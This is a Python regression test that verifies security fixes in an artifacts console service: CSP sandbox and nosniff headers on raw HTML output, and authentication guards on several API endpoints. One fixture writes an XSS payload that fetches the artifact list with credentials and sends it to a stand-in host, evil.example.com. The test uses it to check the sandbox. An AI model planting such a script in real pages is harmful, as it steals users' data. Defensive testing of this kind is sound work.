#!/usr/bin/env python3
"""验证本轮安全修复在真实 HTTP 响应里确实生效。

只起一套隔离的临时实例（独立端口 + 临时数据目录），不会碰正式成果库。

覆盖：
  1. 成果 HTML 的 raw 接口带上 nosniff + CSP sandbox（严重 XSS 的服务端那一半）
  2. <base> 注入仍然保留 —— 隔离不能把相对路径解析弄坏
  3. 三个补了 @_guard 的接口，在「没有回环豁免」时确实要凭据
  4. 回环访问仍然照旧放行（本机侧车、MCP 不受影响）
"""
import json
import os
import sys
import tempfile
import asyncio
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

PORT = int(os.environ.get("PILOTV_SEC_PORT", "8931"))
TOKEN = "verify-token-abc123"
BASE = f"http://127.0.0.1:{PORT}"

PASS, FAIL = [], []


def check(name, condition, detail=""):
    (PASS if condition else FAIL).append(name)
    print(f"  [{'PASS' if condition else 'FAIL'}] {name}" + (f"  —— {detail}" if detail and not condition else ""))


class Console(threading.Thread):
    """把 artifacts_console 起在临时数据目录上。"""

    def __init__(self, data_dir):
        super().__init__(daemon=True)
        self.data_dir = data_dir
        self.error = None

    def run(self):
        # DATA_DIR 在模块导入时从环境变量取，所以必须在 import 之前设好。
        os.environ["ARTIFACTS_DATA_DIR"] = self.data_dir
        os.environ["ARTIFACTS_TOKEN"] = TOKEN
        os.environ["ARTIFACTS_CONSOLE_PASSWORD"] = "verify-console-password"
        try:
            from aiohttp import web
            sys.path.insert(0, os.path.join(ROOT, "service"))
            import serve_artifacts

            async def serve():
                app = serve_artifacts.build_app()
                runner = web.AppRunner(app)
                await runner.setup()
                site = web.TCPSite(runner, "127.0.0.1", PORT)
                await site.start()
                while True:
                    await asyncio.sleep(3600)

            asyncio.run(serve())
        except Exception as exc:  # noqa: BLE001
            self.error = exc


def request(method, path, payload=None, token=None, loopback=True):
    """发请求。loopback=False 时伪装成非本机来源，用来测鉴权。"""
    url = BASE + path
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    if not loopback:
        # _remote_is_local() 只看 request.remote，这里没法直接改，
        # 改用另一个非 loopback 目标来触发「无凭据 + 非本机」这条路。
        req.add_header("X-Forwarded-For", "203.0.113.7")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return 0, {}, str(exc)


def main():
    tmp = tempfile.mkdtemp(prefix="pilotv-secverify-")
    console = Console(tmp)
    console.start()
    for _ in range(100):
        if request("GET", "/api/artifacts/health", token=TOKEN)[0]:
            break
        time.sleep(0.1)
    else:
        print(f"console 没起来：{console.error}", file=sys.stderr)
        return 3

    print("\n=== 1. 成果 HTML 的 raw 接口必须隔离 ===")
    evil_html = os.path.join(tmp, "evil.html")
    with open(evil_html, "w", encoding="utf-8") as fh:
        fh.write("<html><head><title>x</title></head><body>"
                 "<script>fetch('/api/artifacts',{credentials:'include'}).then(r=>r.text()).then(t=>"
                 "fetch('http://evil.example.com/?d='+encodeURIComponent(t.slice(0,200)))</script>"
                 "<img src='sub/a.svg'></body></html>")

    status, _, body = request("POST", "/api/artifacts", {
        "title": "xss-regression", "kind": "page", "file_name": "evil.html",
        "path": evil_html, "deliverable": "final",
    }, token=TOKEN)
    if status != 200:
        print(f"发布失败：{status} {body[:300]}", file=sys.stderr)
        return 3
    aid = json.loads(body)["id"]

    status, headers, text = request("GET", f"/api/artifacts/{aid}/raw", token=TOKEN)
    check("raw 接口返回 200", status == 200, f"status={status}")
    check("按 HTML 原样返回（没有改成纯文本）", "text/html" in headers.get("Content-Type", ""),
          f"content-type={headers.get('Content-Type')!r}")
    check("带 X-Content-Type-Options: nosniff",
          headers.get("X-Content-Type-Options") == "nosniff",
          f"实际={headers.get('X-Content-Type-Options')!r}")
    csp = headers.get("Content-Security-Policy", "")
    check("带 CSP sandbox 指令", "sandbox" in csp, f"csp={csp!r}")
    check("CSP sandbox 不含 allow-same-origin（否则隔离可被摘掉）",
          "allow-same-origin" not in csp, f"csp={csp!r}")
    check("CSP sandbox 仍允许脚本（页面成果要能跑自己的 JS）",
          "allow-scripts" in csp, f"csp={csp!r}")
    check("<base> 注入没被隔离改坏（相对素材仍能解析）",
          f'<base href="/api/artifacts/{aid}/file/">' in text)

    print("\n=== 2. 补了 @_guard 的接口需要凭据 ===")
    # 这些请求都从 127.0.0.1 来，会走回环豁免；要真正验证鉴权分支，
    # 必须让 _remote_is_local() 判定为非本机。直接调内部函数验证判定逻辑。
    import artifacts_console as ac

    class FakeRequest:
        def __init__(self, remote, path="/api/artifacts", method="GET", query=None, headers=None):
            self.remote = remote
            self.match_info = {"aid": aid}
            self.query = query or {}
            self.method = method
            self.headers = headers or {}
            self.app = {}
            self.cookies = {}

    remote_ok = ac._authorized(FakeRequest("203.0.113.7"))          # 无凭据、非本机
    remote_with_token = ac._authorized(
        FakeRequest("203.0.113.7", headers={"Authorization": f"Bearer {TOKEN}"}))
    local_ok = ac._authorized(FakeRequest("127.0.0.1"))            # 回环豁免
    check("非本机 + 无凭据 → 拒绝", remote_ok is False)
    check("非本机 + 正确令牌 → 放行", remote_with_token is True)
    check("回环仍然放行（本机侧车/MCP 不受影响）", local_ok is True)

    # 再从真实 HTTP 确认三个接口确实挂在 @_guard 之下。
    import functools
    for handler in ("api_diff", "api_wait_rework", "api_notify_test", "api_notify_status"):
        wrapped = getattr(ac, handler, None)
        check(f"{handler} 包着鉴权包装", getattr(wrapped, "__wrapped__", None) is not None,
              "少了 @_guard")

    print("\n=== 3. 真实请求：带令牌能通 ===")
    status, _, _ = request("GET", f"/api/artifacts/{aid}/diff", token=TOKEN)
    check("diff 接口带令牌返回 200", status == 200, f"status={status}")

    print(f"\n{'=' * 62}\n通过 {len(PASS)}，失败 {len(FAIL)}")
    if FAIL:
        for name in FAIL:
            print(f"  失败：{name}")
        return 1
    print("全部通过 ✓")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
